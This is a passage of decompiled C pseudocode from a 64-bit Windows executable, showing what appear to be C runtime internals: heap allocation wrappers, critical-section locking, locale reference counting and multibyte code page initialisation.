      break;
    ++a1;
    ++a2;
  }
  return (unsigned __int16)*a1 - (unsigned int)(unsigned __int16)*a2;
}


// ----- sub_14001B374 @ 0x14001b374 -----
void __fastcall sub_14001B374(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)&unk_1400274E0 + a1);
}


// ----- sub_14001B390 @ 0x14001b390 -----
void __fastcall sub_14001B390(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_1400274E0 + a1);
}


// ----- sub_14001B3AC @ 0x14001b3ac -----
__int64 __fastcall sub_14001B3AC(unsigned __int16 *a1)
{
  int v2; // ebx
  int v3; // esi
  __int64 v4; // rbp
  int v5; // eax
  int v6; // ecx
  unsigned __int64 v8; // rax

  if ( a1 == nullptr )
    return 0;
  v2 = 0;
  v3 = 227;
  while ( 1 )
  {
    v4 = (v3 + v2) / 2;
    v5 = sub_14001A110(a1, (unsigned __int16 *)(&off_1400060B0)[2 * v4], 85);
    if ( v5 == 0 )
      break;
    v6 = v4 - 1;
    if ( v5 >= 0 )
      v6 = v3;
    v3 = v6;
    if ( v5 >= 0 )
      v2 = v4 + 1;
    if ( v2 > v6 )
      return 0;
  }
  v8 = dword_1400060B8[4 * v4];
  if ( (v8 & 0x80000000) == 0LL && v8 < 0xE4 )
    return (unsigned int)dword_140004610[4 * v8];
  else
    return 0;
}


// ----- sub_14001B454 @ 0x14001b454 -----
__int64 sub_14001B454()
{
  unsigned int v0; // ebx
  int v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = 0;
  v2 = 0;
  if ( (unsigned __int8)sub_14001D1F4() == 0 )
    sub_14001AAC8((__int64)&v2);
  LOBYTE(v0) = v2 != 1;
  return v0;
}


// ----- sub_14001B484 @ 0x14001b484 -----
int __fastcall sub_14001B484(__int64 a1, DWORD a2, const WCHAR *a3, int a4, WCHAR *a5, int a6)
{
  signed int v6; // ebx
  signed int v10; // eax
  bool v11; // cc

  v6 = a4;
  if ( a4 > 0 )
  {
    v10 = sub_14001C860(a3, a4);
    v11 = v10 < v6;
    v6 = v10 + 1;
    if ( !v11 )
      v6 = v10;
  }
  return sub_14001AB48(a1, a2, a3, v6, a5, a6, 0, 0, 0);
}


// ----- sub_14001B510 @ 0x14001b510 -----
LPVOID __fastcall sub_14001B510(unsigned __int64 a1, unsigned __int64 a2)
{
  SIZE_T v2; // rbx
  LPVOID result; // rax

  if ( a1 != 0 && 0xFFFFFFFFFFFFFFE0uLL / a1 < a2 )
  {
LABEL_10:
    *(_DWORD *)sub_14001A8F0() = 12;
    return nullptr;
  }
  else
  {
    v2 = a2 * a1;
    if ( a2 * a1 == 0 )
      v2 = 1;
    while ( 1 )
    {
      result = HeapAlloc(qword_1400277A8, 8u, v2);
      if ( result != nullptr )
        break;
      if ( (unsigned int)sub_14001D310() == 0 || (unsigned int)sub_14001D210(v2) == 0 )
        goto LABEL_10;
    }
  }
  return result;
}


// ----- sub_14001B590 @ 0x14001b590 -----
void __fastcall sub_14001B590(LPVOID lpMem)
{
  DWORD LastError; // eax
  int v2; // ebx

  if ( lpMem != nullptr && !HeapFree(qword_1400277A8, 0, lpMem) )
  {
    LastError = GetLastError();
    v2 = sub_14001A7D8(LastError);
    *(_DWORD *)sub_14001A8F0() = v2;
  }
}


// ----- sub_14001B5E0 @ 0x14001b5e0 -----
HANDLE sub_14001B5E0()
{
  return qword_1400277A8;
}


// ----- sub_14001B5E8 @ 0x14001b5e8 -----
__int64 __fastcall sub_14001B5E8(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 i; // r8
  volatile signed __int32 *v7; // rdx
  __int64 v8; // rcx

  _InterlockedIncrement((volatile signed __int32 *)(a1 + 16));
  v1 = *(volatile signed __int32 **)(a1 + 224);
  if ( v1 != nullptr )
    _InterlockedIncrement(v1);
  v2 = *(volatile signed __int32 **)(a1 + 240);
  if ( v2 != nullptr )
    _InterlockedIncrement(v2);
  v3 = *(volatile signed __int32 **)(a1 + 232);
  if ( v3 != nullptr )
    _InterlockedIncrement(v3);
  v4 = *(volatile signed __int32 **)(a1 + 256);
  if ( v4 != nullptr )
    _InterlockedIncrement(v4);
  v5 = (volatile signed __int32 **)(a1 + 56);
  for ( i = 6; i != 0; --i )
  {
    if ( *(v5 - 2) != (volatile signed __int32 *)&unk_1400267A8 && *v5 != nullptr )
      _InterlockedIncrement(*v5);
    if ( *(v5 - 3) != nullptr )
    {
      v7 = *(v5 - 1);
      if ( v7 != nullptr )
        _InterlockedIncrement(v7);
    }
    v5 += 4;
  }
  v8 = *(_QWORD *)(a1 + 288);
  if ( v8 == 0 || (char (**)[4])v8 == &off_140003780 )
    return 0x7FFFFFFF;
  else
    return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(v8 + 348));
}


// ----- sub_14001B674 @ 0x14001b674 -----
void __fastcall sub_14001B674(char *lpMem)
{
  _UNKNOWN **v1; // rax
  _DWORD *v3; // rax
  _DWORD *v4; // rcx
  _DWORD *v5; // rcx
  _DWORD *v6; // rax
  LPVOID *v7; // rsi
  __int64 v8; // rbp
  _DWORD **v9; // rdi
  _DWORD *v10; // rcx
  _DWORD *v11; // rcx

  v1 = *((_UNKNOWN ***)lpMem + 31);
  if ( v1 != nullptr && v1 != &off_140026D00 )
  {
    v3 = *((_DWORD **)lpMem + 28);
    if ( v3 != nullptr && *v3 == 0 )
    {
      v4 = *((_DWORD **)lpMem + 30);
      if ( v4 != nullptr && *v4 == 0 )
      {
        sub_14001B590(v4);
        sub_14001C540(*((_QWORD *)lpMem + 31));
      }
      v5 = *((_DWORD **)lpMem + 29);
      if ( v5 != nullptr && *v5 == 0 )
      {
        sub_14001B590(v5);
        sub_14001C64C(*((_QWORD *)lpMem + 31));
      }
      sub_14001B590(*((LPVOID *)lpMem + 28));
      sub_14001B590(*((LPVOID *)lpMem + 31));
    }
  }
  v6 = *((_DWORD **)lpMem + 32);
  if ( v6 != nullptr && *v6 == 0 )
  {
    sub_14001B590((LPVOID)(*((_QWORD *)lpMem + 33) - 254LL));
    sub_14001B590((LPVOID)(*((_QWORD *)lpMem + 34) - 128LL));
    sub_14001B590((LPVOID)(*((_QWORD *)lpMem + 35) - 128LL));
    sub_14001B590(*((LPVOID *)lpMem + 32));
  }
  sub_14001B814(*((LPVOID *)lpMem + 36));
  v7 = (LPVOID *)(lpMem + 296);
  v8 = 6;
  v9 = (_DWORD **)(lpMem + 56);
  do
  {
    if ( *(v9 - 2) != (_DWORD *)&unk_1400267A8 )
    {
      v10 = *v9;
      if ( *v9 != nullptr && *v10 == 0 )
      {
        sub_14001B590(v10);
        sub_14001B590(*v7);
      }
    }
    if ( *(v9 - 3) != nullptr )
    {
      v11 = *(v9 - 1);
      if ( v11 != nullptr && *v11 == 0 )
        sub_14001B590(v11);
    }
    ++v7;
    v9 += 4;
    --v8;
  }
  while ( v8 != 0 );
  sub_14001B590(lpMem);
}


// ----- sub_14001B814 @ 0x14001b814 -----
void __fastcall sub_14001B814(char (**lpMem)[4])
{
  if ( lpMem != nullptr && lpMem != &off_140003780 && *((_DWORD *)lpMem + 87) == 0 )
  {
    sub_14001C6EC();
    sub_14001B590(lpMem);
  }
}


// ----- sub_14001B84C @ 0x14001b84c -----
__int64 __fastcall sub_14001B84C(__int64 a1)
{
  if ( a1 == 0 || (char (**)[4])a1 == &off_140003780 )
    return 0x7FFFFFFF;
  else
    return (unsigned int)_InterlockedDecrement((volatile signed __int32 *)(a1 + 348));
}


// ----- sub_14001B874 @ 0x14001b874 -----
void __fastcall sub_14001B874(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 i; // r8
  volatile signed __int32 *v7; // rdx

  if ( a1 != 0 )
  {
    _InterlockedAdd((volatile signed __int32 *)(a1 + 16), 0xFFFFFFFF);
    v1 = *(volatile signed __int32 **)(a1 + 224);
    if ( v1 != nullptr )
      _InterlockedAdd(v1, 0xFFFFFFFF);
    v2 = *(volatile signed __int32 **)(a1 + 240);
    if ( v2 != nullptr )
      _InterlockedAdd(v2, 0xFFFFFFFF);
    v3 = *(volatile signed __int32 **)(a1 + 232);
    if ( v3 != nullptr )
      _InterlockedAdd(v3, 0xFFFFFFFF);
    v4 = *(volatile signed __int32 **)(a1 + 256);
    if ( v4 != nullptr )
      _InterlockedAdd(v4, 0xFFFFFFFF);
    v5 = (volatile signed __int32 **)(a1 + 56);
    for ( i = 6; i != 0; --i )
    {
      if ( *(v5 - 2) != (volatile signed __int32 *)&unk_1400267A8 && *v5 != nullptr )
        _InterlockedAdd(*v5, 0xFFFFFFFF);
      if ( *(v5 - 3) != nullptr )
      {
        v7 = *(v5 - 1);
        if ( v7 != nullptr )
          _InterlockedAdd(v7, 0xFFFFFFFF);
      }
      v5 += 4;
    }
    sub_14001B84C(*(_QWORD *)(a1 + 288));
  }
}


// ----- sub_14001B91C @ 0x14001b91c -----
__int64 sub_14001B91C()
{
  __int64 v0; // rax
  __int64 *v1; // rdi
  __int64 v2; // rbx

  v0 = sub_14001B014();
  v1 = (__int64 *)(v0 + 144);
  if ( (*(_DWORD *)(v0 + 936) & dword_140026CF0) == 0 || (v2 = *v1, *v1 == 0) )
  {
    sub_14001B374(4);
    v2 = sub_14001B98C(v1, qword_1400274D0[0]);
    sub_14001B390(4);
    if ( v2 == 0 )
      sub_14001B2E4();
  }
  return v2;
}


// ----- sub_14001B98C @ 0x14001b98c -----
__int64 __fastcall sub_14001B98C(__int64 *a1, __int64 a2)
{
  __int64 v3; // rbx

  if ( a2 == 0 || a1 == nullptr )
    return 0;
  v3 = *a1;
  if ( *a1 != a2 )
  {
    *a1 = a2;
    sub_14001B5E8(a2);
    if ( v3 != 0 )
    {
      sub_14001B874(v3);
      if ( *(_DWORD *)(v3 + 16) == 0 && (wchar_t **)v3 != &off_140026640 )
        sub_14001B674((char *)v3);
    }
  }
  return a2;
}


// ----- sub_14001B9F4 @ 0x14001b9f4 -----
void __fastcall sub_14001B9F4(__int64 a1, int *a2, volatile signed __int32 ****a3, int *a4)
{
  _OWORD *v6; // rax
  _OWORD *v7; // rcx
  __int64 v8; // r8
  __int64 i; // r9
  _OWORD *v10; // rax
  _OWORD *v11; // rcx
  LPVOID *v12; // rcx

  sub_14001B374(*a2);
  v6 = (**a3)[17] + 6;
  v7 = (_OWORD *)qword_140027740;
  if ( qword_140027740 == 0 )
    goto LABEL_7;
  if ( (**a3)[17] == (volatile signed __int32 *)-24LL )
  {
    sub_1400230C0(qword_140027740, 0, 257);
LABEL_7:
    *(_DWORD *)sub_14001A8F0() = 22;
    sub_14001A770();
    v8 = 2;
    goto LABEL_8;
  }
  v8 = 2;
  for ( i = 2; i != 0; --i )
  {
    *v7 = *v6;
    v7[1] = v6[1];
    v7[2] = v6[2];
    v7[3] = v6[3];
    v7[4] = v6[4];
    v7[5] = v6[5];
    v7[6] = v6[6];
    v7 += 8;
    *(v7 - 1) = v6[7];
    v6 += 8;
  }
  *(_BYTE *)v7 = *(_BYTE *)v6;
LABEL_8:
  v10 = (_OWORD *)((char *)(**a3)[17] + 281);
  v11 = (_OWORD *)qword_140027748;
  if ( qword_140027748 == 0 )
  {
LABEL_13:
    *(_DWORD *)sub_14001A8F0() = 22;
    sub_14001A770();
    goto LABEL_14;
  }
  if ( (**a3)[17] == (volatile signed __int32 *)-281LL )
  {
    sub_1400230C0(qword_140027748, 0, 256);
    goto LABEL_13;
  }
  do
  {
    *v11 = *v10;
    v11[1] = v10[1];
    v11[2] = v10[2];
    v11[3] = v10[3];
    v11[4] = v10[4];
    v11[5] = v10[5];
    v11[6] = v10[6];
    v11 += 8;
    *(v11 - 1) = v10[7];
    v10 += 8;
    --v8;
  }
  while ( v8 != 0 );
LABEL_14:
  if ( _InterlockedExchangeAdd(**a3[1], 0xFFFFFFFF) == 1 )
  {
    v12 = (LPVOID *)*a3[1];
    if ( *v12 != &unk_1400267B0 )
      sub_14001B590(*v12);
  }
  **a3[1] = (**a3)[17];
  _InterlockedIncrement((**a3)[17]);
  sub_14001B390(*a4);
}


// ----- sub_14001BBC4 @ 0x14001bbc4 -----
__int64 __fastcall sub_14001BBC4(UINT a1)
{
  UINT OEMCP; // eax
  _QWORD v4[3]; // [rsp+20h] [rbp-28h] BYREF
  char v5; // [rsp+38h] [rbp-10h]

  sub_14001A020((__int64)v4, nullptr);
  dword_140027758 = 0;
  switch ( a1 )
  {
    case 0xFFFFFFFE:
      dword_140027758 = 1;
      OEMCP = GetOEMCP();
LABEL_5:
      a1 = OEMCP;
      break;
    case 0xFFFFFFFD:
      dword_140027758 = 1;
      OEMCP = GetACP();
      goto LABEL_5;
    case 0xFFFFFFFC:
      dword_140027758 = 1;
      a1 = *(_DWORD *)(v4[1] + 12LL);
      break;
    default:
      break;
  }
  if ( v5 != 0 )
    *(_DWORD *)(v4[0] + 936LL) &= ~2u;
  return a1;
}


// ----- sub_14001BC44 @ 0x14001bc44 -----
char __fastcall sub_14001BC44(__int64 a1)
{
  __int64 v2; // rdx
  _WORD *v3; // rdi
  __int64 i; // rcx
  __int64 j; // rdi
  char *v6; // rcx
  __int64 v7; // rbx
  char *v8; // rcx
  char result; // al

  sub_1400230C0(a1 + 24, 0, 257);
  v2 = 0;
  v3 = (_WORD *)(a1 + 12);
  *(_QWORD *)(a1 + 4) = 0;
  *(_QWORD *)(a1 + 544) = 0;
  for ( i = 6; i != 0; --i )
    *v3++ = 0;
  for ( j = 0; j < 257; ++j )
  {
    v6 = (char *)&unk_1400267B0 + j;
    v6[a1 - (_QWORD)&unk_1400267C8 + 48] = v6[24];
  }
  v7 = a1 - (_QWORD)&unk_1400268C9;
  do
  {
    v8 = (char *)&unk_1400267B0 + v2++;
    result = v8[281];
    v8[v7 + 562] = result;
  }
  while ( v2 < 256 );
  return result;
}


// ----- sub_14001BCDC @ 0x14001bcdc -----
char __fastcall sub_14001BCDC(__int64 a1)
{
  UINT v2; // ecx
  unsigned int v3; // eax
  _BYTE *v4; // rcx
  __int64 v5; // rbx
  BYTE v6; // al
  BYTE *LeadByte; // rdx
  unsigned int v8; // r8d
  __int64 i; // rcx
  _BYTE *v10; // rdx
  _BYTE *v11; // rax
  char v12; // cl
  unsigned int v13; // edx
  _BYTE *v14; // rcx
  struct _cpinfo CPInfo; // [rsp+50h] [rbp-B0h] BYREF
  _BYTE v17[256]; // [rsp+70h] [rbp-90h] BYREF
  _BYTE v18[256]; // [rsp+170h] [rbp+70h] BYREF
  _BYTE v19[256]; // [rsp+270h] [rbp+170h] BYREF
  _BYTE v20[1024]; // [rsp+370h] [rbp+270h] BYREF

  v2 = *(_DWORD *)(a1 + 4);
  memset(&CPInfo, 0, sizeof(CPInfo));
  if ( v2 == 65001 || !GetCPInfo(v2, &CPInfo) )
  {
    v13 = 0;
    v14 = (_BYTE *)(a1 + 25);
    do
    {
      if ( v13 - 97 + 32 > 0x19 )
      {
        if ( v13 - 97 > 0x19 )
        {
          LOBYTE(v11) = 0;
        }
        else
        {
          *v14 |= 0x20u;
          LOBYTE(v11) = v13 - 32;
        }
      }
      else
      {
        *v14 |= 0x10u;
        LOBYTE(v11) = v13 + 32;
      }
      v14[256] = (_BYTE)v11;
      ++v13;
      ++v14;
    }
    while ( v13 < 0x100 );
  }
  else
  {
    v3 = 0;
    v4 = v17;
    v5 = 256;
    do
      *v4++ = v3++;
    while ( v3 < 0x100 );
    v6 = CPInfo.LeadByte[0];
    LeadByte = CPInfo.LeadByte;
    v17[0] = 32;
    while ( v6 != 0 )
    {
      v8 = LeadByte[1];
      for ( i = v6; (unsigned int)i <= v8 && (unsigned int)i < 0x100; i = (unsigned int)(i + 1) )
        v17[i] = 32;
      LeadByte += 2;
      v6 = *LeadByte;
    }
    sub_14001CA68(0, 1, v17, 256, v20, *(_DWORD *)(a1 + 4), 0);
    sub_14001D6EC(0, *(_QWORD *)(a1 + 544), 256, (unsigned int)v17, 256, (__int64)v18, 256, *(_DWORD *)(a1 + 4), 0);
    sub_14001D6EC(0, *(_QWORD *)(a1 + 544), 512, (unsigned int)v17, 256, (__int64)v19, 256, *(_DWORD *)(a1 + 4), 0);
    v10 = v20;
    v11 = (_BYTE *)(a1 + 25);
    do
    {
      if ( (*v10 & 1) != 0 )
      {
        *v11 |= 0x10u;
        v12 = v18[(_QWORD)v11 - a1 - 25];
      }
      else if ( (*v10 & 2) != 0 )
      {
        *v11 |= 0x20u;
        v12 = v19[(_QWORD)v11 - a1 - 25];
      }
      else
      {
        v12 = 0;
      }
      v11[256] = v12;
      v10 += 2;
      ++v11;
      --v5;
    }
    while ( v5 != 0 );
  }
  return (char)v11;
}


// ----- sub_14001BED4 @ 0x14001bed4 -----
__int64 sub_14001BED4(UINT a1, char a2, ...)
{
  unsigned int v4; // edi
  _DWORD *v6; // rbx
  _OWORD *v7; // rcx
  __int64 v8; // rdx
  __int64 v9; // r8
  _OWORD *v10; // rax
  __int128 v11; // xmm1
  __int128 v12; // xmm0
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  __int128 v15; // xmm1
  __int128 v16; // xmm0
  __int128 v17; // xmm1
  __int128 v18; // xmm0
  __int128 v19; // xmm1
  __int64 v20; // rax
  _OWORD *v21; // rcx
  _OWORD *v22; // rax
  __int128 v23; // xmm1
  __int128 v24; // xmm0
  __int128 v25; // xmm1
  __int128 v26; // xmm0
  __int128 v27; // xmm1
  __int128 v28; // xmm0
  __int128 v29; // xmm1
  __int128 v30; // xmm0
  __int128 v31; // xmm1
  __int64 v32; // rax
  unsigned int v33; // esi
  void *v34; // rcx
  int v35; // [rsp+28h] [rbp-E0h] BYREF
  int v36; // [rsp+2Ch] [rbp-DCh] BYREF
  __int64 v37; // [rsp+30h] [rbp-D8h] BYREF
  volatile signed __int32 ***v38[2]; // [rsp+38h] [rbp-D0h] BYREF
  _BYTE v39[560]; // [rsp+48h] [rbp-C0h] BYREF
  __int64 v40; // [rsp+2A8h] [rbp+1A0h] BYREF
  va_list va; // [rsp+2A8h] [rbp+1A0h]
  void **v42; // [rsp+2B0h] [rbp+1A8h] BYREF
  va_list va1; // [rsp+2B0h] [rbp+1A8h]
  va_list va2; // [rsp+2B8h] [rbp+1B0h] BYREF

  va_start(va2, a2);
  va_start(va1, a2);
  va_start(va, a2);
  v40 = va_arg(va1, _QWORD);
  va_copy(va2, va1);
  v42 = va_arg(va2, void **);
  sub_14001C144(v40, v42);
  v4 = sub_14001BBC4(a1);
  if ( v4 == *(_DWORD *)(*(_QWORD *)(v40 + 136) + 4LL) )
    return 0;
  v6 = (_DWORD *)sub_14001C800(552);
  if ( v6 != nullptr )
  {
    v7 = v39;
    v8 = 4;
    v9 = 4;
    v10 = *(_OWORD **)(v40 + 136);
    do
    {
      v11 = v10[1];
      *v7 = *v10;
      v12 = v10[2];
      v7[1] = v11;
      v13 = v10[3];
      v7[2] = v12;
      v14 = v10[4];
      v7[3] = v13;
      v15 = v10[5];
      v7[4] = v14;
      v16 = v10[6];
      v7[5] = v15;
      v17 = v10[7];
      v10 += 8;
      v7[6] = v16;
      v7 += 8;
      *(v7 - 1) = v17;
      --v9;
    }
    while ( v9 != 0 );
    v18 = *v10;
    v19 = v10[1];
    v20 = *((_QWORD *)v10 + 4);
    *v7 = v18;
    v7[1] = v19;
    *((_QWORD *)v7 + 4) = v20;
    v21 = v6;
    v22 = v39;
    do
    {
      v23 = v22[1];
      *v21 = *v22;
      v24 = v22[2];
      v21[1] = v23;
      v25 = v22[3];
      v21[2] = v24;
      v26 = v22[4];
      v21[3] = v25;
      v27 = v22[5];
      v21[4] = v26;
      v28 = v22[6];
      v21[5] = v27;
      v29 = v22[7];
      v22 += 8;
      v21[6] = v28;
      v21 += 8;
      *(v21 - 1) = v29;
      --v8;
    }
    while ( v8 != 0 );
    v30 = *v22;
    v31 = v22[1];
    v32 = *((_QWORD *)v22 + 4);
    *v21 = v30;
    v21[1] = v31;
    *((_QWORD *)v21 + 4) = v32;
    *v6 = 0;
    v33 = sub_14001C278(v4, v6, 0, 128);
    if ( v33 == -1 )
    {
      *(_DWORD *)sub_14001A8F0() = 22;
      sub_14001B590(v6);
      return 0xFFFFFFFFLL;
    }
    else
    {
      if ( a2 == 0 )
        sub_14001B2A8();
      if ( _InterlockedExchangeAdd(*(volatile signed __int32 **)(v40 + 136), 0xFFFFFFFF) == 1 )
      {
        v34 = *(void **)(v40 + 136);
        if ( v34 != &unk_1400267B0 )
          sub_14001B590(v34);
      }
      *v6 = 1;
      *(_QWORD *)(v40 + 136) = v6;
      if ( (*(_DWORD *)(v40 + 936) & dword_140026CF0) == 0 )
      {
        va_copy((va_list)v38, va);
        va_copy((va_list)&v38[1], va1);
        v36 = 5;
        LODWORD(v37) = 5;
        sub_14001B9F4((__int64)&v35, (int *)&v37, v38, &v36);
        if ( a2 != 0 )
          off_1400267A0 = *v42;
      }
      sub_14001B590(nullptr);
      return v33;
    }
  }
  else
  {
    sub_14001B590(nullptr);
    return 0xFFFFFFFFLL;
  }
}


// ----- sub_14001C144 @ 0x14001c144 -----
volatile signed __int32 *__fastcall sub_14001C144(__int64 a1, volatile signed __int32 **a2)
{
  volatile signed __int32 *v4; // rbx
  volatile signed __int32 *v5; // rax

  if ( (dword_140026CF0 & *(_DWORD *)(a1 + 936)) != 0 && *(_QWORD *)(a1 + 144) != 0 )
  {
    v4 = *(volatile signed __int32 **)(a1 + 136);
  }
  else
  {
    sub_14001B374(5);
    v4 = *(volatile signed __int32 **)(a1 + 136);
    if ( v4 != *a2 )
    {
      if ( v4 != nullptr
        && _InterlockedExchangeAdd(v4, 0xFFFFFFFF) == 1
        && v4 != (volatile signed __int32 *)&unk_1400267B0 )
      {
        sub_14001B590((LPVOID)v4);
      }
      v5 = *a2;
      *(_QWORD *)(a1 + 136) = *a2;
      _InterlockedIncrement(v5);
      v4 = v5;
    }
    sub_14001B390(5);
  }
  if ( v4 == nullptr )
    sub_14001B2E4();
  return v4;
}


// ----- sub_14001C1FC @ 0x14001c1fc -----
char sub_14001C1FC()
{
  PVOID v0; // rax

  if ( byte_14002775C == 0 )
  {
    qword_140027748 = (__int64)&unk_140026AF0;
    qword_140027750[0] = (__int64)&unk_1400267B0;
    qword_140027740 = (__int64)&unk_1400269E0;
    v0 = sub_14001B030();
    sub_14001BED4(0xFFFFFFFD, 1, v0, qword_140027750);
    byte_14002775C = 1;
  }
  return 1;
}


// ----- sub_14001C25C @ 0x14001c25c -----
volatile signed __int32 *sub_14001C25C()
{
  __int64 v0; // rax

  v0 = sub_14001B014();
  return sub_14001C144(v0, (volatile signed __int32 **)qword_140027750);
}


// ----- sub_14001C278 @ 0x14001c278 -----
__int64 __fastcall sub_14001C278(UINT a1, __int64 a2)
{
  const wchar_t *v3; // rbx
  UINT v4; // edi
  unsigned int v5; // r14d
  _DWORD *v6; // rax
  int v7; // ebp
  _WORD *v8; // rdi
  __int64 m; // rcx
  bool v10; // zf
  BYTE *j; // rcx
  unsigned int v12; // eax
  unsigned int v13; // edx
  __int64 v14; // rdi
  __int64 v15; // rdx
  _BYTE *v16; // rax
  __int64 k; // rcx
  const wchar_t *v18; // rax
  __int64 v20; // rax
  _BYTE *v21; // r15
  __int64 v22; // r14
  char *v23; // r9
  unsigned __int8 *v24; // rdx
  unsigned int v25; // r8d
  __int64 v26; // r10
  UINT v27; // edi
  UINT v28; // edi
  UINT v29; // edi
  _WORD *v30; // rdx
  __int64 i; // rcx
  struct _cpinfo CPInfo; // [rsp+20h] [rbp-48h] BYREF

  memset(&CPInfo, 0, sizeof(CPInfo));
  v3 = nullptr;
  v4 = sub_14001BBC4(a1);
  if ( v4 == 0 )
  {
LABEL_57:
    sub_14001BC44(a2);
    return 0;
  }
  v5 = 0;
  v6 = &unk_140026C00;
  v7 = 1;
  do
  {
    if ( *v6 == v4 )
    {
      sub_1400230C0(a2 + 24, 0, 257);
      v20 = v5;
      v21 = &unk_140026BF0;
      v22 = 4;
      v23 = (char *)&unk_140026C10 + 48 * v20;
      do
      {
        v24 = (unsigned __int8 *)v23;
        if ( *v23 != 0 )
        {
          do
          {
            if ( v24[1] == 0 )
              break;
            v25 = *v24;
            if ( v25 <= v24[1] )
            {
              v26 = v25 + 1;
              do
              {
                if ( (unsigned int)v26 >= 0x101 )
                  break;
                ++v25;
                *(_BYTE *)(v26 + a2 + 24) |= *v21;
                v26 = (unsigned int)(v26 + 1);
              }
              while ( v25 <= v24[1] );
            }
            v24 += 2;
          }
          while ( *v24 != 0 );
        }
        v23 += 8;
        ++v21;
        --v22;
      }
      while ( v22 != 0 );
      *(_DWORD *)(a2 + 4) = v4;
      *(_DWORD *)(a2 + 8) = 1;
      v27 = v4 - 932;
      if ( v27 != 0 )
      {
        v28 = v27 - 4;
        if ( v28 != 0 )
        {
          v29 = v28 - 13;
          if ( v29 != 0 )
          {
            if ( v29 == 1 )
              v3 = L"zh-TW";
          }
          else
          {
            v3 = L"ko-KR";
          }
        }
        else
        {
          v3 = L"zh-CN";
        }
      }
      else
      {
        v3 = L"ja-JP";
      }
      *(_QWORD *)(a2 + 544) = v3;
      v30 = (_WORD *)(a2 + 12);
      for ( i = 6; i != 0; --i )
      {
        *v30 = *(_WORD *)((char *)v30 + (_QWORD)&unk_140026C00 + 48 * v20 - a2 - 8);
        ++v30;
      }
      goto LABEL_56;
    }
    ++v5;
    v6 += 12;
  }
  while ( v5 < 5 );
  if ( v4 == 65000 || !IsValidCodePage((unsigned __int16)v4) )
    return 0xFFFFFFFFLL;
  if ( v4 == 65001 )
  {
    *(_QWORD *)(a2 + 4) = 65001;
    *(_QWORD *)(a2 + 544) = 0;
    *(_DWORD *)(a2 + 24) = 0;
    *(_WORD *)(a2 + 28) = 0;
    goto LABEL_9;
  }
  if ( !GetCPInfo(v4, &CPInfo) )
  {
    if ( dword_140027758 != 0 )
      goto LABEL_57;
    return 0xFFFFFFFFLL;
  }
  sub_1400230C0(a2 + 24, 0, 257);
  v10 = CPInfo.MaxCharSize == 2;
  *(_DWORD *)(a2 + 4) = v4;
  *(_QWORD *)(a2 + 544) = 0;
  if ( v10 )
  {
    for ( j = CPInfo.LeadByte; *j != 0; j += 2 )
    {
      if ( j[1] == 0 )
        break;
      v12 = j[1];
      v13 = *j;
      if ( v13 <= v12 )
      {
        v14 = v13 + 1;
        v15 = v12 - v13 + 1;
        do
        {
          *(_BYTE *)(v14 + a2 + 24) |= 4u;
          v14 = (unsigned int)(v14 + 1);
          --v15;
        }
        while ( v15 != 0 );
      }
    }
    v16 = (_BYTE *)(a2 + 26);
    for ( k = 254; k != 0; --k )
      *v16++ |= 8u;
    switch ( *(_DWORD *)(a2 + 4) )
    {
      case 0x3A4:
        v18 = L"ja-JP";
        break;
      case 0x3A8:
        v18 = L"zh-CN";
        break;
      case 0x3B5:
        v18 = L"ko-KR";
        break;
      case 0x3B6:
        v18 = L"zh-TW";
        break;
      default:
        v18 = nullptr;
        break;
    }
    *(_QWORD *)(a2 + 544) = v18;
  }
  else
  {
    v7 = 0;
  }
  *(_DWORD *)(a2 + 8) = v7;
LABEL_9:
  v8 = (_WORD *)(a2 + 12);
  for ( m = 6; m != 0; --m )
    *v8++ = 0;
LABEL_56:
  sub_14001BCDC(a2);
  return 0;
}


// ----- sub_14001C540 @ 0x14001c540 -----
void __fastcall sub_14001C540(_QWORD *a1)
{
  void *v2; // rcx
  void *v3; // rcx
  void *v4; // rcx
  void *v5; // rcx
  void *v6; // rcx
  void *v7; // rcx
  void *v8; // rcx
  void *v9; // rcx
  void *v10; // rcx
  void *v11; // rcx
  void *v12; // rcx
  void *v13; // rcx
  void *v14; // rcx

  if ( a1 != nullptr )
  {
    v2 = (void *)a1[3];
    if ( v2 != off_140026D18 )
      sub_14001B590(v2);
    v3 = (void *)a1[4];
    if ( v3 != off_140026D20 )
      sub_14001B590(v3);
    v4 = (void *)a1[5];
    if ( v4 != off_140026D28 )
      sub_14001B590(v4);
    v5 = (void *)a1[6];
    if ( v5 != off_140026D30 )
      sub_14001B590(v5);
    v6 = (void *)a1[7];
    if ( v6 != off_140026D38 )
      sub_14001B590(v6);
    v7 = (void *)a1[8];
    if ( v7 != off_140026D40 )
      sub_14001B590(v7);
    v8 = (void *)a1[9];
    if ( v8 != off_140026D48 )
      sub_14001B590(v8);
    v9 = (void *)a1[13];
    if ( v9 != off_140026D68 )
      sub_14001B590(v9);
    v10 = (void *)a1[14];
    if ( v10 != off_140026D70 )
      sub_14001B590(v10);
    v11 = (void *)a1[15];
    if ( v11 != off_140026D78 )
      sub_14001B590(v11);
    v12 = (void *)a1[16];
    if ( v12 != off_140026D80 )
      sub_14001B590(v12);
    v13 = (void *)a1[17];
    if ( v13 != off_140026D88 )
      sub_14001B590(v13);
    v14 = (void *)a1[18];
    if ( v14 != off_140026D90 )
      sub_14001B590(v14);
  }
}


// ----- sub_14001C64C @ 0x14001c64c -----
void __fastcall sub_14001C64C(__int64 a1)
{
  void *v2; // rcx
  void *v3; // rcx
  void *v4; // rcx
  void *v5; // rcx
  void *v6; // rcx

  if ( a1 != 0 )
  {
    v2 = *(void **)a1;
    if ( v2 != off_140026D00 )
      sub_14001B590(v2);
    v3 = *(void **)(a1 + 8);
    if ( v3 != off_140026D08 )
      sub_14001B590(v3);
    v4 = *(void **)(a1 + 16);
    if ( v4 != off_140026D10 )
      sub_14001B590(v4);
    v5 = *(void **)(a1 + 88);
    if ( v5 != off_140026D58 )
      sub_14001B590(v5);
    v6 = *(void **)(a1 + 96);
    if ( v6 != off_140026D60 )
      sub_14001B590(v6);
  }
}


